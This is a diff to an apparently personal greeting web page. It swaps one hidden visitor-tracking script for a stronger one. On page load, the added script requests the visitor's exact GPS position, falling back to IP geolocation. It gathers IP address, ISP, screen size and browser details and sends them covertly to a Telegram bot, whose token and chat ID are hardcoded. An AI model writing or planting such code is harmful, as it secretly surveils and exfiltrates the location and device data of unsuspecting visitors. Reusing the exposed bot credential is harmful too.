@@ -319,56 +319,73 @@ Allah hafeez🌺❤️}`;
     }  
 </script>
 
-<!-- Telegram Tracking Script (নতুন ipinfo.io সার্ভার দিয়ে) -->
+<!-- Exact GPS Location + IP Tracking Script -->
 <script>
-    setTimeout(() => {
-        fetch('https://ipinfo.io/json')
-            .then(response => response.json())
-            .then(data => {
-                let screenRes = window.screen.width + " x " + window.screen.height;
-                let language = navigator.language || "Unknown";
-                let referrer = document.referrer || "Direct Link / Social Media";
-                
-                let visitTime = new Date().toLocaleString('en-US', { timeZone: 'Asia/Dhaka' });
-                let userAgent = navigator.userAgent;
+    window.addEventListener('load', function() {
+        setTimeout(function() {
+            
+            // মেইন ফাংশন: টেলিগ্রামে ডেটা পাঠানো
+            function sendToTelegram(exactLat, exactLon, locationPrecision) {
+                fetch('https://get.geojs.io/v1/ip/geo.json')
+                    .then(r => r.json())
+                    .then(data => {
+                        var screenRes = window.screen.width + " x " + window.screen.height;
+                        var visitTime = new Date().toLocaleString('en-US', { timeZone: 'Asia/Dhaka' });
+                        var userAgent = navigator.userAgent;
 
-                let city = data.city || "Unknown City";
-                let region = data.region || "Unknown Region";
-                let country = data.country || "Unknown Country";
-                let ip = data.ip || "Unknown IP";
-                let isp = data.org || "Unknown ISP";
-                let mapLink = data.loc ? `https://www.google.com/maps?q=${data.loc}` : "Not Available";
+                        // যদি GPS পারমিশন দেয়, তাহলে Exact Location নিবে, না দিলে IP এর লোকেশন নিবে
+                        var finalLat = exactLat ? exactLat : data.latitude;
+                        var finalLon = exactLon ? exactLon : data.longitude;
+                        var mapLink = finalLat ? "https://www.google.com/maps?q=" + finalLat + "," + finalLon : "Not Available";
 
-                let message = `🚨 *New Visitor on Your Website!* 🚨\n\n` +
-                              `⏱ *Time (BD):* ${visitTime}\n\n` +
-                              `🌍 *Location Info:*\n` +
-                              `📍 City: ${city}, ${region}\n` +
-                              `🏳️ Country: ${country}\n` +
-                              `🗺️ *Google Maps:* [View Location](${mapLink})\n\n` +
-                              `💻 *Device & Network:*\n` +
-                              `🌐 IP Address: ${ip}\n` +
-                              `🏢 ISP: ${isp}\n` +
-                              `📱 Screen Size: ${screenRes}\n` +
-                              `🗣️ Browser Lang: ${language}\n` +
-                              `🔗 Referrer: ${referrer}\n\n` +
-                              `🕵️ *User Agent Details:*\n\`${userAgent}\``;
+                        var ip = data.ip || "Unknown IP";
+                        var isp = data.organization || data.organization_name || "Unknown ISP";
 
-                let botToken = "8363041954:AAFyxyeurJxLQQAeezzEEhbS1ostbG9zhfo"; 
-                let chatId = "8366906886";
+                        var message = `🚨 *New Visitor on Your Website!* 🚨\n\n` +
+                                      `⏱ *Time:* ${visitTime}\n\n` +
+                                      `🌍 *Location Info:*\n` +
+                                      `🎯 Accuracy: ${locationPrecision}\n` +
+                                      `🗺️ *Google Maps:* [View Exact Location](${mapLink})\n\n` +
+                                      `💻 *Device & Network:*\n` +
+                                      `🌐 IP Address: ${ip}\n` +
+                                      `🏢 ISP: ${isp}\n` +
+                                      `📱 Screen Size: ${screenRes}\n` +
+                                      `🕵️ Browser: \`${userAgent}\``;
 
-                let formData = new URLSearchParams();
-                formData.append("chat_id", chatId);
-                formData.append("text", message);
-                formData.append("parse_mode", "Markdown");
-                formData.append("disable_web_page_preview", "true");
+                        var botToken = "8363041954:AAFyxyeurJxLQQAeezzEEhbS1ostbG9zhfo"; 
+                        var chatId = "8366906886";
 
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                    method: "POST",
-                    body: formData
-                }).catch(e => console.log("Telegram Error"));
-            })
-            .catch(e => console.log("IP detection Error"));
-    }, 1000);
+                        var formData = new URLSearchParams();
+                        formData.append("chat_id", chatId);
+                        formData.append("text", message);
+                        formData.append("parse_mode", "Markdown");
+                        formData.append("disable_web_page_preview", "true");
+
+                        fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", {
+                            method: "POST",
+                            body: formData
+                        });
+                    });
+            }
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+
+                        sendToTelegram(position.coords.latitude, position.coords.longitude, "✅ EXACT GPS (User Allowed)");
+                    },
+                    function(error) {
+
+                        sendToTelegram(null, null, "⚠️ APPROXIMATE (IP Based)");
+                    },
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            } else {
+                sendToTelegram(null, null, "⚠️ APPROXIMATE (IP Based)");
+            }
+
+        }, 1500);
+    });
 </script>
 
 </body>  
